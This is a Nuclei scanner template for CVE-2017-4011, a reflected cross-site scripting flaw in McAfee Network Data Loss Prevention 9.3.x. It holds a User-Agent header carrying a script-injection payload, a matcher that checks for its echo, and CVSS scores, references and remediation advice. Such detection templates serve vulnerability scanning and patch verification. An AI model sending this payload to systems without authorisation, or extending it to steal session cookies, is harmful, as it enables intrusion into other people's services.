http:
- headers:
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//
  matchers:
  - part: body
    type: word
    words:
    - var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
id: CVE-2017-4011
info:
  author: geeknik
  classification:
    cpe: cpe:2.3:a:mcafee:network_data_loss_prevention:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-4011
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.93135
    epss-score: 0.1089
  description: McAfee Network Data Loss Prevention User-Agent 9.3.x contains a cross-site
    scripting vulnerability which allows remote attackers to get session/cookie information
    via modification of the HTTP request.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the targeted user''s browser,
    potentially leading to session hijacking or unauthorized access to sensitive information.

    '
  metadata:
    max-request: 1
    product: network_data_loss_prevention
    vendor: mcafee
  name: McAfee Network Data Loss Prevention 9.3.x - Cross-Site Scripting
  reference:
  - https://medium.com/@david.valles/cve-2017-4011-reflected-xss-found-in-mcafee-network-data-loss-prevention-ndlp-9-3-x-cf20451870ab
  - https://kc.mcafee.com/corporate/index?page=content&id=SB10198
  - https://nvd.nist.gov/vuln/detail/CVE-2017-4011
  - http://www.securitytracker.com/id/1038523
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches or updates provided by McAfee to
    mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2017,mcafee,xss,vuln
